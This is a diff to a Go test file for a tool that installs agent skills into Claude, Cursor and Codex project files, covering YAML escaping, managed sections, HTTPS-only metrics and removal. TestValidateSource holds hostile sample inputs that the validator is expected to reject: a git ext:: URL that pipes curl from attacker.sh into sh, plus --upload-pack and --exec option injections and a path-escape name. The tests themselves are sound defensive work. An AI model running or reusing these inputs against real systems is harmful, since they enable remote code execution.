@@ -135,7 +135,7 @@ func TestFrontmatterAndCursor(t *testing.T) {
 		t.Fatal(err)
 	}
 	mdc, _ := os.ReadFile(filepath.Join(proj, ".cursor", "rules", "fm.mdc"))
-	if !strings.Contains(string(mdc), "description: does things") || !strings.Contains(string(mdc), "Body here.") {
+	if !strings.Contains(string(mdc), `description: "does things"`) || !strings.Contains(string(mdc), "Body here.") {
 		t.Fatalf("bad mdc: %s", mdc)
 	}
 	// Global scope is a no-op for cursor.
@@ -175,6 +175,20 @@ func TestCodexManagedSection(t *testing.T) {
 		t.Fatalf("duplicated section:\n%s", s)
 	}
 
+	// A skill body containing its own h3 must not orphan the remainder: three
+	// syncs used to leak a stale copy of everything after the heading.
+	os.WriteFile(filepath.Join(dir, "SKILL.md"),
+		[]byte("---\nname: cx\ndescription: codex skill\n---\nintro\n\n### Usage\nrun it"), 0o644)
+	for i := 0; i < 3; i++ {
+		if _, err := a.Install(Skill{Name: "cx", Dir: dir}, proj, nil); err != nil {
+			t.Fatal(err)
+		}
+	}
+	got, _ = os.ReadFile(filepath.Join(proj, "AGENTS.md"))
+	if n := strings.Count(string(got), "### Usage"); n != 1 {
+		t.Fatalf("h3 in body orphaned %d copies:\n%s", n, got)
+	}
+
 	// Second skill appends inside the same managed region.
 	dir2 := writeSkill(t, repo, "cy", "---\nname: cy\ndescription: second\n---\nsecond body")
 	if _, err := a.Install(Skill{Name: "cy", Dir: dir2}, proj, nil); err != nil {
@@ -212,10 +226,13 @@ func TestFlushMetrics(t *testing.T) {
 	t.Setenv("HOME", home)
 	cmdTrack([]string{"a"})
 	var got []usageEvent
-	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
+	srv := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
 		json.NewDecoder(r.Body).Decode(&got)
 	}))
 	defer srv.Close()
+	prev := metricsClient
+	metricsClient = srv.Client()
+	defer func() { metricsClient = prev }()
 	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: srv.URL}})
 	if len(got) != 1 || got[0].Skill != "a" {
 		t.Fatalf("sink got %+v", got)
@@ -225,8 +242,101 @@ func TestFlushMetrics(t *testing.T) {
 	}
 	// Failed flush keeps the queue.
 	cmdTrack([]string{"b"})
-	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "http://127.0.0.1:1/nope"}})
+	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "https://127.0.0.1:1/nope"}})
 	if len(readEvents()) != 1 {
 		t.Fatal("queue lost on failed flush")
+	}
+}
+
+func TestValidateSource(t *testing.T) {
+	bad := []Source{
+		{Name: "ok", URL: "ext::sh -c 'curl attacker.sh|sh'"},          // transport helper = code execution
+		{Name: "ok", URL: "--upload-pack=/tmp/x"},                      // option injection
+		{Name: "../../.claude/skills/code-review", URL: "https://x/y"}, // path escape
+		{Name: ".hidden", URL: "https://x/y"},
+		{Name: "ok", URL: "https://x/y", Pin: "--exec=evil"},
+		{Name: "ok", URL: "notaurl"},
+	}
+	for _, src := range bad {
+		if err := validateSource(src); err == nil {
+			t.Errorf("expected rejection: %+v", src)
+		}
+	}
+	good := []Source{
+		{Name: "org", URL: "https://github.com/a/b.git"},
+		{Name: "team", URL: "git@github.com:a/b.git", Pin: "v1.2.0"},
+		{Name: "local", URL: "file:///tmp/x"},
+		{Name: "ssh", URL: "ssh://git@host/a/b.git"},
+	}
+	for _, src := range good {
+		if err := validateSource(src); err != nil {
+			t.Errorf("expected accept %+v: %v", src, err)
+		}
+	}
+}
+
+func TestMetricsRequiresHTTPS(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	cmdTrack([]string{"secret-skill"})
+	flushMetrics(&Config{Metrics: Metrics{Enabled: true, Endpoint: "http://metrics.internal/skills"}})
+	if len(readEvents()) != 1 {
+		t.Fatal("events should be kept, not shipped over cleartext http")
+	}
+}
+
+func TestSubscriptionSemantics(t *testing.T) {
+	all := &Config{}
+	if !all.subscribed("anything") {
+		t.Fatal("unset list means subscribe to everything")
+	}
+	none := &Config{GlobalSkills: &[]string{}}
+	if none.subscribed("anything") {
+		t.Fatal("explicitly emptied list must mean none")
+	}
+	one := &Config{GlobalSkills: &[]string{"code-review"}}
+	if !one.subscribed("code-review") || one.subscribed("other") {
+		t.Fatal("explicit list must be honored exactly")
+	}
+}
+
+func TestAdapterRemove(t *testing.T) {
+	home := t.TempDir()
+	t.Setenv("HOME", home)
+	repo := t.TempDir()
+	proj := t.TempDir()
+	dir := writeSkill(t, repo, "gone", "---\nname: gone\ndescription: d\n---\nbody")
+	sk := Skill{Name: "gone", Dir: dir, Source: "s"}
+
+	for _, a := range []Adapter{claudeAdapter{}, cursorAdapter{}, codexAdapter{}} {
+		if _, err := a.Install(sk, proj, map[string]InstalledSkill{}); err != nil {
+			t.Fatal(err)
+		}
+		if err := a.Remove("gone", proj); err != nil && !os.IsNotExist(err) {
+			t.Fatal(err)
+		}
+	}
+	if _, err := os.Stat(filepath.Join(proj, ".claude", "skills", "gone")); !os.IsNotExist(err) {
+		t.Fatal("claude skill not removed")
+	}
+	if _, err := os.Stat(filepath.Join(proj, ".cursor", "rules", "gone.mdc")); !os.IsNotExist(err) {
+		t.Fatal("cursor rule not removed")
+	}
+	agents, _ := os.ReadFile(filepath.Join(proj, "AGENTS.md"))
+	if strings.Contains(string(agents), "### gone") {
+		t.Fatalf("codex section not removed:\n%s", agents)
+	}
+}
+
+func TestYAMLScalarEscaping(t *testing.T) {
+	repo := t.TempDir()
+	proj := t.TempDir()
+	dir := writeSkill(t, repo, "y", "---\nname: y\ndescription: Review code: find bugs, \"fast\"\n---\nbody")
+	if _, err := (cursorAdapter{}).Install(Skill{Name: "y", Dir: dir}, proj, nil); err != nil {
+		t.Fatal(err)
+	}
+	mdc, _ := os.ReadFile(filepath.Join(proj, ".cursor", "rules", "y.mdc"))
+	if !strings.Contains(string(mdc), `description: "Review code: find bugs, \"fast\""`) {
+		t.Fatalf("description not YAML-escaped:\n%s", mdc)
 	}
 }
